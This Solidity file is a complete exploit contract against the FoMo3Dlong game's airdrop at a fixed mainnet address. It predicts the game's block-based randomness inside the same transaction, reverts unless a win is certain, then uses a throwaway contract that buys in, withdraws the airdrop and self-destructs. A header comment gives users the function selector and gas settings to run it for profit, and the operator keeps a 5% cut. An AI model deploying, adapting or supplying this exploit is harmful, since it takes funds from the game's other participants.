pragma solidity ^0.4.24;

/**
 * How to use just send a tx of 0 eth to this contract address with 600k gas limit and message data 0x9e5faafc
 * although it will probably not use that much it is just to be safe, as metamask will say the tx will fail
 * because it doesnt know what the random number will be so you have to put the gas limit in yourself, also
 * remember any unused gas is refunded so it wont cost much even if it fails. (failed tx will cost only a couple cents)
 **/

contract FoMo3Dlong{
    uint256 public airDropPot_;
    uint256 public airDropTracker_;
    function withdraw() public;
    function buyXaddr(address _affCode, uint256 _team) public payable;
}

contract MainHub{
    using SafeMath for *;
    address public owner;
    bool public closed = false;
    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    
    modifier onlyOwner{
        require(msg.sender==owner);
        _;
    }
    
    modifier onlyNotClosed{
        require(!closed);
        _;
    }
    
    constructor() public payable{
        require(msg.value==.1 ether);
        owner = msg.sender;
    }
    
    function attack() public onlyNotClosed{
        require(code.airDropPot_()>=.5 ether); //requires there is at least a pot of .5 ether otherwise not worth it.
        require(airdrop());
        uint256 initialBalance = address(this).balance;
        (new AirdropHacker).value(.1 ether)();
        uint256 postBalance = address(this).balance;
        uint256 takenAmount = postBalance - initialBalance;
        msg.sender.transfer(takenAmount*95/100); //5% fee, you didnt risk anything anyway.
        require(address(this).balance>=.1 ether);//last sanity check (why the hell not?) if it reaches this you already won anyway
    }
    
    function airdrop() private view returns(bool)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
            (block.number)
            
        )));
        if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_())//looks at thier airdrop tracking number
            return(true);
        else
            return(false);
    }
    
    function drain() public onlyOwner{
        closed = true;
        owner.transfer(address(this).balance);//since funds are transfered immediately any money that is left in the contract is mine.
    }
    function() public payable{}
}

contract AirdropHacker{
    FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
    constructor() public payable{
        code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2);//just a random address
        code.withdraw();
        require(address(this).balance>=.1 ether);//would get 1/4 of airdrop, which appears to be on average .2 ether, this is just a sanity check
        selfdestruct(msg.sender);
    }
    
    function() public payable{}
    
}

library SafeMath {
    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
}